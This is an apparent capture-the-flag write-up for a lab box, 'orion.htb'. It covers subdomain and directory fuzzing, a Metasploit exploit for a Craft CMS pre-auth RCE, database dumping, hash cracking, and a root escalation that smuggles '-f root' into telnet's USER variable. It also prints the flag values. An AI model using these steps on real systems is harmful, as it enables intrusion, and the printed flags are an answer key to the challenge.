Target : 10.129.39.41

Started off with the port scan: 22,80

![](../Pasted%20image%2020260702151115.png)

Adding the ip address in /etc/hosts

10.129.39.41 orion.htb

Enumerating port 80:

*Subdomain Fuzzing using FFUF*

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.orion.htb" -u http://orion.htb/ -mc 200`

Got nothing.

Directory bruteforcing for finding interesting endpoints:

`gobuster dir -u "http://orion.htb/api/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

`gobuster dir -u "http://orion.htb/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

Found : `http://orion.htb/admin/login` which is running craft cms (5.6.16)

Looking for known exploits for this specific service and version

"Craft CMS 5.6.16 contains a critical unauthenticated Remote Code Execution (RCE) vulnerability (CVE-2025-32432) via the `__class` parameter in the asset transforms endpoint."

Got the initial foothold by using the exisiting exploitation in the metasploit.

exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

![](../Pasted%20image%2020260702153623.png)

And printenv reveals password

![](../Pasted%20image%2020260702153733.png)

There is only one user account in this machine, which is adam. Tried reusing the credential, but it didn't worked.

Connecting Database:

`mysql -u root -p`        (Successfully connected.)

```
SHOW DATABASES;
USE <dbname>;
SHOW TABLES;
SELECT * FROM <tablename>;
SELECT username,email,password FROM <tablename>;
```

![](../Pasted%20image%2020260702154939.png)

Crack the hash: ft. john

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

password: **darkangel**

![](../Pasted%20image%2020260702155104.png)

Connecting ADAM with the found password:

`ssh adam@$ip`
`user.txt : 0781e918e64bc8a009177da6a760a1e5`

Privilege Escalation : ROOT

telnet (GNU inetutils) 2.7 - **CVE-2026-24061**

Exploitation is pretty simple (https://medium.com/@shivam_bathla/telnetd-auth-bypass-to-root-f6e239d692b5)

`export USER="-f root"`
`telnet -a 127.0.0.1`                 (this triggers the auth, and we got the root shell)

`root.txt : 28d3e111f47d5313e3c524229bbcdb69



